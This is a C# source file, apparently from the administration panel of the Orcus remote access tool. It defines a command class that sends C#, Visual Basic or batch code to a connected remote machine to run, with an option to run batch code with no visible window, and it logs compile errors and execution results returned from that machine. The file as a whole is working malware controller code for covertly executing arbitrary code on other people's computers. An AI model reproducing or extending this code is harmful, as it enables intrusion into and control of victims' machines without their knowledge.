using System;
using System.Collections.Generic;
using System.Text;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.Code;

namespace Orcus.Administration.Commands.Code
{
    [DescribeCommandByEnum(typeof (CodeCommunication))]
    public class CodeCommand : Command
    {
        public override void ResponseReceived(byte[] parameter)
        {
            switch ((CodeCommunication) parameter[0])
            {
                case CodeCommunication.ResponseErrors:
                    var errors = BitConverter.ToInt32(parameter, 1);
                    var line = BitConverter.ToInt32(parameter, 5);
                    var errorText = Encoding.UTF8.GetString(parameter, 9, parameter.Length - 9);
                    LogService.Error(string.Format((string) Application.Current.Resources["SentCodeContainsErrors"],
                        errors,
                        errors == 1
                            ? (string) Application.Current.Resources["CodeContainsError"]
                            : (string) Application.Current.Resources["CodeContainsErrors"], line, errorText));
                    break;
                case CodeCommunication.ResponseGenerationException:
                    LogService.Error(string.Format((string) Application.Current.Resources["CodeMainMethodNotFound"],
                        Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1)));
                    break;
                case CodeCommunication.ResponseInvokeSuccessful:
                    LogService.Receive((string) Application.Current.Resources["CodeSuccessfullyExecuted"]);
                    break;
                case CodeCommunication.ResponseBatchCodeExecuted:
                    LogService.Receive((string) Application.Current.Resources["BatchCodeExecuted"]);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void SendCsharpCode(string source)
        {
            LogService.Send((string) Application.Current.Resources["SendCodeToExecute"]);
            var package = new List<byte> {(byte) CodeCommunication.SendCsharpCode};
            package.AddRange(Encoding.UTF8.GetBytes(source));
            ConnectionInfo.SendCommand(this, package.ToArray());
        }

        public void SendVisualBasicCode(string source)
        {
            LogService.Send((string) Application.Current.Resources["SendCodeToExecute"]);
            var package = new List<byte> {(byte) CodeCommunication.SendVbCode};
            package.AddRange(Encoding.UTF8.GetBytes(source));
            ConnectionInfo.SendCommand(this, package.ToArray());
        }

        public void SendBatchCode(string source, bool createNoWindow)
        {
            LogService.Send((string) Application.Current.Resources["SendBatchCode"]);
            var package = new List<byte> {(byte) CodeCommunication.SendBatchCode, (byte) (createNoWindow ? 1 : 0)};
            package.AddRange(Encoding.UTF8.GetBytes(source));
            ConnectionInfo.SendCommand(this, package.ToArray());
        }

        protected override uint GetId()
        {
            return 3;
        }
    }
}